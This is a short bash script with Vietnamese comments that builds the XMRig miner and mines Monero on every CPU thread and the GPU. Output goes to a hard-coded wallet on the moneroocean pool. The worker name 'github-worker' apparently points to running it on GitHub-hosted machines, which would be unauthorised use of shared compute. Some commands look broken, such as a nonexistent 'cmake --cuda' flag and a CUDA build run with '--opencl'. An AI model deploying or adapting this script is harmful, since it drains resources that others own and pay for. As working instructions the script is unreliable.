#!/bin/bash

# Cập nhật hệ thống và cài đặt các gói cần thiết
echo "Cập nhật hệ thống và cài đặt các gói cần thiết..."
sudo apt update
sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev libcuda1-455 nvidia-cuda-toolkit

# Clone repository XMRig
echo "Tải mã nguồn XMRig..."
git clone https://github.com/xmrig/xmrig.git

# Build XMRig
echo "Xây dựng XMRig..."
cd xmrig
mkdir build
cd build
cmake .. -DXMRIG_DEPS=curl,ssl --cuda
make -j$(nproc)

# Cấu hình thông tin khai thác
POOL="gulf.moneroocean.stream:10128"
WALLET="47KaS4N5MH1b3xt71ceoJaPjmepikrgGpSYk3zdXpeLS4XbXsdk7mJji9rjcPRRhaHBs3Rit2rQnC7kqn5DJY6kwLRh3s7m"
WORKER="github-worker"

# Sử dụng toàn bộ CPU và GPU
THREADS=$(nproc) # Sử dụng tối đa CPU
GPU_ENABLED="--opencl"  # Kích hoạt GPU

# Bắt đầu khai thác với toàn bộ tài nguyên (CPU + GPU)
echo "Bắt đầu khai thác Monero với CPU và GPU..."
./xmrig -o $POOL -u $WALLET -p $WORKER -k --coin monero --threads=$THREADS $GPU_ENABLED
